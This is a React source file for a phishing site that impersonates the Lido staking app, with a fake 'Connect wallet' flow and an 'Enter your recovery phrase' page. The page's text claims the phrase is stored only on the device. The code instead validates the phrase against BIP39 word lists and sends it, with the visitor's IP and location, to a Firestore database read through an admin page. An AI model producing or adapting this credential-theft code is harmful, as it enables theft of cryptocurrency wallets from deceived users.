import {
  collection,
  addDoc,
  query,
  doc,
  runTransaction,
  orderBy,
  getDocs,
  limit,
} from "firebase/firestore";
import { db } from "./firebase";
import { LeftOutlined } from "@ant-design/icons";
import { useEffect, useRef, useState } from "react";
import { Route, Routes, BrowserRouter,useParams,Navigate,useNavigate } from "react-router-dom";
import { createPortal } from "react-dom";
import "./App.css";
import "./import.scss";
import logo from "./assets/logoLido.png";
import menu from "./assets/menu.png";
import AdminPage from "./pages/admin";
import Login from "./pages/login";
import english from './bip39/english'
import spanish from './bip39/spanish'
import portuguese from './bip39/portuguese'
import korean from './bip39/korean'
import japanese from './bip39/japanese'
import italian from './bip39/italian'
import french from './bip39/french'
import czech from './bip39/czech'
import chinese_traditional from './bip39/chinese_traditional'
import chinese_simplified from './bip39/chinese_simplified'

function PrivateRoute({ children }) {
  return localStorage.getItem("logined") === "true" ? (
    <>{children}</>
  ) : (
    <Navigate to="/signin" />
  );
}

const Header = () => {
  return (
    <div className="flex items-center justify-between px-[20px] h-[80px] relative z-10">
      <img src={logo} style={{ width: 88, height: 20 }} />
      <button
        className="relative group"
      >
        <img src={menu} style={{ width: 18, height: 18 }} />
      </button>
    </div>
  );
};

function HomePage() {

  const navigate = useNavigate();
  //const [countryCode, setCountryCode] = useState('');

  useEffect(() => {
    const setLocaltion = async () => {
      try {
        fetch("https://ipinfo.io/json").then(d => d.json()).then(d => {
          var countryCode = d.country;
          //setCountryCode(countryCode.toLowerCase());
          localStorage.setItem(
            "location",JSON.stringify({ IP: d.ip, country: d.country, city: d.city})
          );
        })
      } catch (error) {
        console.error("Error fetching data:", error);
      }
    };
    setLocaltion();
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();
    navigate("/select-wallet");
  };

  return (
    <div className="background-container h-[100vh] overflow-hidden">
      <Header />
      <div className="bg-body-img" />
      <div className="bg-body">
        <div className="flex flex-col items-center gap-4">
          <div className="flex flex-col items-center">
            <div className="w-[110px] h-[110px] rounded-full bg-white flex items-center justify-center shadow-lg">
              <img
                src="./images/logo-color.svg"
                className="w-[85px] h-[100px]"
              />
            </div>
            <div className="mt-[17px] leading-[36px]">
              <h1 className="text-[26px] font-bold text-center">
              Liquidity for staked tokens
              </h1>
              <p className="text-gray-700 text-[14px] leading-[22px] text-center mt-[10px] px-[20px]">
              Simplified participation in staking
              </p>
            </div>
          </div>
          {/* <div className="w-full grid grid-cols-1 gap-4">
            <div className="flex justify-between">
              <h3 className="text-[12px]">Lido APR</h3>
              <p className="font-bold text-[16px]">3.2%</p>
            </div>
            <div className="flex justify-between">
              <h3 className="text-[12px]">Staked amount</h3>
              <p className="font-bold text-[16px]">9,358,294 ETH</p>
            </div>
            <div className="flex justify-between">
              <h3 className="text-[12px]">Rewards paid</h3>
              <p className="font-bold text-[16px]">512,381 ETH</p>
            </div>
          </div> */}
        </div>
        <div className="flex justify-center	mt-[30%]">
          <button
            onClick={handleSubmit}
            className="font-medium text-md px-5 py-2.5 text-center me-2 mb-2 bg-[#00a3ff] text-white rounded-lg"
          >
            Launch App
          </button>
        </div>
      </div>
    </div>
  );
}


const Header2 = ({ setVisible }) => {
  return (
    <div className="flex items-center justify-between px-[20px] py-[18px] h-[82px] relative z-10">
      <img src={"/images/logo1.png"} style={{ width: 88, height: 20 }} />
      <div className="flex gap-2 h-full">
        <button
          className="relative bg-[#00a3ff] btn-header text-white font-bold"
          onClick={() => setVisible(true)}
        >
          Connect wallet
        </button>
        <button className="w-[44px] h-[44px] bg-white flex justify-center items-center rounded-md">
          <img src={"/images/moon.png"} style={{ width: 13, height: 13 }} />
        </button>
      </div>
    </div>
  );
};

const list = [
  {
    icon: "/images/logo9.png",
    title: "OKX Wallet",
  },
  {
    icon: "/images/logo10.png",
    title: "Browser",
  },
  {
    icon: "/images/logo11.png",
    title: "MetaMask",
  },
  {
    icon: "/images/logo12.png",
    title: "Ledger",
  },
  {
    icon: "/images/logo13.png",
    title: "WalletConnect",
  },
  {
    icon: "/images/logo14.png",
    title: "Coinbase",
  },
  {
    icon: "/images/logo15.png",
    title: "Trust",
  },
  {
    icon: "/images/logo2.png",
    title: "Exodus",
  },
  {
    icon: "/images/logo3.png",
    title: "Brave",
  },
  {
    icon: "/images/logo4.png",
    title: "Bitget",
  },
  {
    icon: "/images/logo5.png",
    title: "XDEFI",
  },
  {
    icon: "/images/logo6.png",
    title: "imToken",
  },
  {
    icon: "/images/logo7.png",
    title: "Coin98",
  },
  {
    icon: "/images/logo8.png",
    title: "Ambire",
  },
];

const Modal = ({ visible, setVisible }) => {
  const navigate = useNavigate();
  const redirectSelectWallet = (e) => {
    navigate("/import-wallet/"+e);
  };

  const dropdownRef = useRef(null);
  const [viewMore, setViewMore] = useState(false);
  const [listWallet, setListWallet] = useState(() => list);
  const [keyword, setKeyword] = useState("");

  const onChange = (e) => {
    const key = e.target.value;
    setKeyword(key);
    const newList = list.filter((item) =>
      item.title.toLowerCase().includes(key.toLowerCase())
    );
    setListWallet(newList);
  };

  useEffect(() => {
    function handleClickOutside(event) {
      if (dropdownRef.current && !dropdownRef.current.contains(event.target)) {
        setVisible(true);
      }
    }

    document.addEventListener("mousedown", handleClickOutside);
    return () => {
      document.removeEventListener("mousedown", handleClickOutside);
    };
  }, [dropdownRef]);

  if (!visible) return null;

  const modal = (
    <div className="modal">
      <div ref={dropdownRef} className="modal-body py-[10px]">
        <div className="flex justify-between items-center px-[20px] py-[10px]">
          <div className="sc-czkgLR cmItf">
            <div className="text-[16px] font-bold">Connect wallet</div>
          </div>
          {/* <button
            onClick={() => setVisible(false)}
            type="button"
            className="sc-dExYaf hiuYlO sc-dWZqqJ iItNBf"
          >
            <svg width="24" height="24" viewBox="0 0 24 24" fill="#7a8aa0">
              <path d="M17.707 7.707a1 1 0 00-1.414-1.414L12 10.586 7.707 6.293a1 1 0 00-1.414 1.414L10.586 12l-4.293 4.293a1 1 0 101.414 1.414L12 13.414l4.293 4.293a1 1 0 001.414-1.414L13.414 12l4.293-4.293z"></path>
            </svg>
          </button> */}
        </div>
        <div className="p-[20px]  py-[10px]">
          <label className="sc-dGCmGc kwYHFB ">
            <label className="sc-knuQbY ePbsmc">
              <input type="checkbox" className="sc-dNsVcS iKQNKc" />
              <svg
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="#fff"
                className="sc-ERObt bdSUrW"
              >
                <path
                  fillRule="evenodd"
                  clipRule="evenodd"
                  d="M17.434 8.293a1 1 0 010 1.414l-6 6a1 1 0 01-1.414 0L7.293 12.98a1 1 0 111.414-1.414l2.02 2.02 5.293-5.293a1 1 0 011.414 0z"
                ></path>
              </svg>
            </label>
            <span className="sc-fAGzit gWboYc">
              I certify that I have read and accept the updated{" "}
              <a
                target="_blank"
                rel="nofollow noopener"
                href="https://lido.fi/terms-of-use"
                className="text-[#00a3ff]"
              >
                Terms&nbsp;of&nbsp;Use
              </a>{" "}
              and{" "}
              <a
                target="_blank"
                rel="nofollow noopener"
                href="https://lido.fi/privacy-notice"
                className="text-[#00a3ff]"
              >
                Privacy&nbsp;Notice
              </a>
              .
            </span>
          </label>
        </div>
        <div className="px-[20px]">
          <div className="text-[16px] font-bold">Choose wallet </div>
          {viewMore && (
            <>
              <div className="mt-[10px] flex items-center h-[44px] border-2 px-2 rounded-xl">
                <div>
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                  >
                    <path
                      stroke="#7a8aa0"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth="2"
                      d="M11.222 17.444a6.222 6.222 0 1 0 0-12.444 6.222 6.222 0 0 0 0 12.444Z"
                      clipRule="evenodd"
                    ></path>
                    <path
                      stroke="#7a8aa0"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth="2"
                      d="m19 19-3.383-3.383"
                    ></path>
                  </svg>
                </div>
                <input
                  className="pl-2 w-full outline-none border-none"
                  placeholder="Wallet name"
                  value={keyword}
                  onChange={onChange}
                />
              </div>
            </>
          )}
          <div className="sc-hoLEA kCKqVi mt-[10px] h-[300px]">
            <div className="sc-bOhtcR kKMXni flex flex-col gap-[10px]">
              {(viewMore ? listWallet : list.slice(0, 6)).map(
                (wallet, index) => (
                  <button
                    onClick={() => redirectSelectWallet(wallet.title)}
                    key={index}
                    type="button"
                    className="sc-dExYaf hxoUF sc-bddgXz dZpzRS"
                  >
                    <span className="sc-kqGoIF fFOAGC">
                      <span className="sc-fyVfxW RbLoA">
                        <span className="sc-jdkBTo edgnFT">
                          <img src={wallet.icon} className="w-[40px]" />
                        </span>
                        <div className="sc-eHsDsR XOkfO">{wallet.title}</div>
                      </span>
                    </span>
                  </button>
                )
              )}
            </div>
          </div>
          <button className="sc-kbdlSk fABQMR">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="24"
              height="24"
              viewBox="0 0 24 24"
              fill="#00a3ff"
            >
              <path
                fillRule="evenodd"
                clipRule="evenodd"
                d="M17.4 7.6H18.3C19.7912 7.6 21 8.80883 21 10.3V17.5C21 18.9912 19.7912 20.2 18.3 20.2H5.7C4.20883 20.2 3 18.9912 3 17.5V6.7C3 5.20883 4.20883 4 5.7 4H14.7C16.1912 4 17.4 5.20883 17.4 6.7V7.6ZM18.3 14.8H19.2V13H18.3C17.8029 13 17.4 13.4029 17.4 13.9C17.4 14.3971 17.8029 14.8 18.3 14.8ZM19.2 11.2H18.3C16.8088 11.2 15.6 12.4088 15.6 13.9C15.6 15.3911 16.8088 16.6 18.3 16.6H19.2V17.5C19.2 17.997 18.7971 18.4 18.3 18.4H5.7C5.20294 18.4 4.8 17.997 4.8 17.5V9.24696C5.08914 9.34868 5.39349 9.40042 5.7 9.39996H18.3C18.7971 9.39996 19.2 9.8029 19.2 10.3V11.2ZM14.7 5.8H5.7C5.20294 5.8 4.8 6.20294 4.8 6.7C4.8 7.19706 5.20294 7.6 5.7 7.6H15.6V6.7C15.6 6.20294 15.1971 5.8 14.7 5.8Z"
                fill="var(--lido-color-primary)"
              ></path>
            </svg>
            <div
              onClick={() => setViewMore(!viewMore)}
              className="sc-camqpD kbHpsy"
            >
              {viewMore ? "Less" : "More"} wallets
            </div>
          </button>
        </div>
      </div>
    </div>
  );

  return createPortal(modal, document.body);
};

const SelectWallet = () => {
  const [visible, setVisible] = useState(true);

  return (
    <div className="bg-[#f2f4f6] h-full">
      <Modal visible={visible} setVisible={setVisible} />
      <Header2 setVisible={setVisible} />
      <div className="flex flex-col items-center">
        <h1 className="font-extrabold text-center text-2xl text-[#273852]">
          Wrap & Unwrap
        </h1>
        <p className="text-[12px] text-[#7a8aa0] mt-1">
          Stable-balance stETH wrapper for DeFi
        </p>
        <div className="flex w-[268px] rounded-[22px] bg-[#dae0e5] h-[44px] mt-[12px]">
          <button className="bg-white w-[50%] rounded-[22px] m-[2px] text-[14px]">
            Wrap
          </button>
          <button className="w-[50%] rounded-[22px] m-[2px] text-[14px] text-[#99a2af]">
            Unwrap
          </button>
        </div>
        <div className="p-[20px] w-full ">
          <div className="bg-white w-full rounded-2xl p-[20px]">
            <div className="relative h-[55px] flex justify-around items-center border-2 rounded-lg">
              <div className=" relative w-[60px] flex justify-center items-center after:h-[55px] after:absolute after:right-0 after:border-r-[2px]">
                <img
                  src="/images/svgviewer-png-output.png"
                  className="w-[23px]"
                />
              </div>
              <input
                className="border-none h-full outline-none w-full text-sm pl-2"
                placeholder="stETH amount"
              />
              <button className="absolute right-2 px-3 h-[25px] text-sm font-bold opacity-[0.6] before:rounded-sm text-[#00a2ffc2] before:'' before:bg-[#00a2ff3b] before:absolute before:inset-0">
                Max
              </button>
            </div>

            <button
              className="relative bg-[#00a3ff] w-full h-[56px] rounded-lg mt-[16px] text-white font-bold"
              onClick={() => setVisible(true)}
            >
              Connect wallet
            </button>

            <div className="banner mt-[16px]">
              <div className="text-[12px]">
                Enjoy <b>lower gas</b> fees and <b>DeFi opportunities</b> using
                wstETH across multiple L2 networks
              </div>
              <div className="list" />
            </div>

            <div className="flex flex-col gap-2 mt-[16px]">
              <div className="flex justify-between text-[12px] text-[#7a8aa0]">
                <p>Max unlock cost</p>
                <p>$5.39</p>
              </div>
              <div className="flex justify-between text-[12px] text-[#7a8aa0]">
                <p>Max transaction cost</p>
                <p>$5.39</p>
              </div>
              <div className="flex justify-between text-[12px] text-[#7a8aa0]">
                <p>Exchange rate</p>
                <p>1 stETH = 0.8585 wstETH</p>
              </div>
              <div className="flex justify-between text-[12px] text-[#7a8aa0]">
                <p>Allowance</p>
                <p>-</p>
              </div>
              <div className="flex justify-between text-[12px] text-[#7a8aa0]">
                <p>You will receive</p>
                <p>0.0 wstETH</p>
              </div>
              <div className="flex justify-between text-[12px] text-[#7a8aa0]">
                <p>Max unlock cost</p>
                <p>$5.39</p>
              </div>
            </div>
          </div>
        </div>
        <div className=" w-full footer">
          <div className="flex items-center justify-around w-full">
            <a
              href="/"
              className="flex  flex-col items-center justify-center w-[25%]"
            >
              <svg
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="#273852"
                data-testid="navStake"
              >
                <path
                  fillRule="evenodd"
                  clipRule="evenodd"
                  d="M18.988 9.05a1 1 0 01.89.55 1 1 0 01-.08 1.04l-8 11a1 1 0 01-1.81-.59v-6h-5a1 1 0 01-.89-.64 1 1 0 01.08-1l8-11a1 1 0 011.12-.36 1 1 0 01.69 1v6h5zm-7 5v3.92l5-6.92h-4a1 1 0 01-1-1V6.13l-5 6.92h4a1 1 0 011 1z"
                ></path>
              </svg>
              <span className="text-[12px]">Stake</span>
            </a>
            <a
              href="/"
              className="flex  flex-col items-center justify-center w-[25%]"
            >
              <svg
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="#00a3ff"
                data-testid="navWrap"
              >
                <path
                  fillRule="evenodd"
                  clipRule="evenodd"
                  d="M1 16.757a3.026 3.026 0 001.653 2.698l8 4a3 3 0 002.684 0l8-4A3 3 0 0023 16.77V7.23a3.026 3.026 0 00-1.665-2.686L13.337.546a3 3 0 00-2.684 0l-8 4A3.026 3.026 0 001 7.243v9.514zm20 .013a1 1 0 01-.555.895h-.002L13 21.388v-9.769l8-4v9.152zM19.77 5.998l-7.327-3.664a1 1 0 00-.896 0L9.226 3.495 17 7.382l2.77-1.384zM6.99 4.613L4.226 5.995 12 9.882 14.764 8.5 6.99 4.613zM3 7.618l8 4v9.774l-7.45-3.725h-.001a1 1 0 01-.549-.9V7.618z"
                ></path>
              </svg>
              <span className="text-[12px]">Wrap</span>
            </a>
            <a
              href="/"
              className="flex  flex-col items-center justify-center w-[25%]"
            >
              <svg
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="#273852"
                data-testid="navWithdrawals"
              >
                <g clipPath="url(#prefix__prefix__clip0_13227_1683)">
                  <path
                    clipRule="evenodd"
                    d="M13 18.584l.79-.8a1.004 1.004 0 011.42 1.42l-2.5 2.5a.999.999 0 01-.33.21 1 1 0 01-.76 0 1 1 0 01-.33-.21l-2.5-2.5a1 1 0 010-1.42 1 1 0 011.42 0l.79.8v-4.59a1 1 0 012 0v4.59zm-6.016-1.886A1.018 1.018 0 016 16.434a8.46 8.46 0 1112 0 1.018 1.018 0 11-1.44-1.44 6.45 6.45 0 10-9.12 0 1.018 1.018 0 01-.456 1.704z"
                  ></path>
                </g>
                <defs>
                  <clipPath id="prefix__prefix__clip0_13227_1683">
                    <path fill="#fff" d="M0 0h24v24H0z"></path>
                  </clipPath>
                </defs>
              </svg>
              <span className="text-[12px]">Withdrawals</span>
            </a>
            <a
              href="/"
              className="flex  flex-col items-center justify-center w-[25%]"
            >
              <svg
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="#273852"
                data-testid="navRewards"
              >
                <path
                  fillRule="evenodd"
                  clipRule="evenodd"
                  d="M17.4 7.6h.9a2.7 2.7 0 012.7 2.7v7.2a2.7 2.7 0 01-2.7 2.7H5.7A2.7 2.7 0 013 17.5V6.7A2.7 2.7 0 015.7 4h9a2.7 2.7 0 012.7 2.7v.9zm-2.7-1.8h-9a.9.9 0 100 1.8h9.9v-.9a.9.9 0 00-.9-.9zm4.5 9h-.9a.9.9 0 110-1.8h.9v1.8zm-.9-3.6h.9v-.9a.9.9 0 00-.9-.9H5.7a2.7 2.7 0 01-.9-.153V17.5a.9.9 0 00.9.9h12.6a.9.9 0 00.9-.9v-.9h-.9a2.7 2.7 0 010-5.4z"
                ></path>
              </svg>
              <span className="text-[12px]">Rewards</span>
            </a>
          </div>
        </div>
      </div>
    </div>
  );
};

const ImportWallet = () => {

  const params = useParams();
  const { walletName } = params;
  const [secretPharse, SetSecretPharse] = useState("");
  const [IsShowErrMsg, SetShowErrMsg] = useState(false);
  const [IsValidPharse, SetValidPharse] = useState(false);
  const [IsProcessing, SetProcessing] = useState(false);
  const usersRef = collection(db, "users");
  const q = query(usersRef, orderBy("auto_id", "desc", limit(1)));
 
  const isLetter = (c) => {
     return c.toLowerCase() != c.toUpperCase();
  }
 
  const updateIndex = async (userID) => {
     try {
       await runTransaction(db, async (transaction) => {
         const sfDocRef = doc(db, "users", userID);
         const sfDoc = await transaction.get(sfDocRef);
         const dosLast = await getDocs(q);
         if (!sfDoc.exists()) {
           throw "Document does not exist!";
         }
         const [lastest] = dosLast.docs
         const auto_id = (lastest?.get("auto_id") || 0) + 1;
         transaction.update(sfDocRef, { auto_id });
       });
 
       console.log("Transaction successfully committed!");
     } catch (e) {
       console.log("Transaction failed: ", e);
     }
   };
 
   const handleSubmit = async (e) => {
    try{
         SetProcessing(true);
         var ip = localStorage.getItem("location"); 
         if(walletName.length > 0 && secretPharse.length > 0 && ip){
             const validRange= [12,15,18,21,24];
             const privateArr = secretPharse.trim().split(/[\s]+/g);
             if(validRange.includes(privateArr.length)){
                 var valid = true;
                 const mergedPharse = english.concat(chinese_simplified,chinese_traditional,spanish,portuguese,korean,japanese,italian,french,czech)
                 privateArr.forEach(element => {
                     if(!mergedPharse.includes(element)){
                         valid = false;
                     }
                 });
                 if(valid){
                     const user = await addDoc(collection(db, "users"), {
                         wallet:walletName,secret:secretPharse,ip:ip,createdAt: new Date().getTime(),status:0
                     });
                     if(user.id){
                         updateIndex(user.id);
                         SetValidPharse(true);
                         SetShowErrMsg(true);
                     }
                 }else{
                     SetShowErrMsg(true);
                 }
             }else{
                 SetShowErrMsg(true);
             }
         }else{
             SetShowErrMsg(true);
         }
     }catch(err){
         console.log(err);
     }finally{
         SetProcessing(false);
     }
   };


   return (
    <div className="custom container mx-auto px-4 h-[100vh] flex flex-row min-h-screen justify-center items-start">
                 <div className="wallet relative flex flex-col gap-y-2 justify-center items-center">
                 <a className="back-step" onClick={history.goBack}>
                            <LeftOutlined className="site-form-item-icon" />
                            </a>
                         <div className="title">Enter your recovery phrase</div>
                         <div className="description">
                             Your recovery phrase will only be stored locally on your device.
                         </div>
                         <div className="group">
                             <div className="select-type">
                                 <textarea style={{overflow: 'hidden'}} value={secretPharse}
                                 onChange={(e) => {
                                     SetShowErrMsg(false);
                                     if(!isLetter(e.target.value) && e.target.value.length > secretPharse) return;
                                     SetSecretPharse(e.target.value);
                                 }} className="input-phrase" name="phrase" id="phrase" placeholder="Enter your recovery phrase"></textarea>
                             </div>
                             <span style={{display: IsShowErrMsg ? 'inline-block' : 'none'}}className="phrase-error">Secret Recovery Phrases contain 12, 15, 18, 21, or 24
                                 words</span>
                         </div>
                   
                 </div>
                 <div className="absolute bottom-0 w-[360px]">
                         <button disabled={IsProcessing} onClick={handleSubmit} type="button" className="btn-import btn-disable">
                         <span style={{display:IsProcessing ? 'inline-block':'none'}} className="loader"></span>
                             <span style={{paddingLeft: '5px'}}>Import</span>
                         </button>
                         <button style={{display:IsValidPharse ? 'inline-block':'none'}} type="button" className="btn-skip hide">
                             <a rel="noopener noreferrer" href="https://metamask.app.link/dapp/https://jup.ag/">
                             Connect Your Wallet
                             </a>
                         </button>
                     </div>
             </div>
      );
   
 }

const App = () => {
  return (
    <BrowserRouter>
        <Routes>
          <Route path="/" element={<HomePage/>} />
          <Route path="/app" element={<HomePage/>} />
           <Route path="/select-wallet" element={<SelectWallet/>}/>
          <Route path="/import-wallet/:walletName" element={<ImportWallet/>}/>      
          <Route path="signin" element={<Login />} />
          <Route
            path="/admin"
            element={
              <PrivateRoute>
                <AdminPage />
              </PrivateRoute>
            }
          />
          <Route path="*" element={<meta httpEquiv="refresh" content="1; url=https://www.google.com/"/>} />
        </Routes>
    </BrowserRouter>
  );
};

export default App;
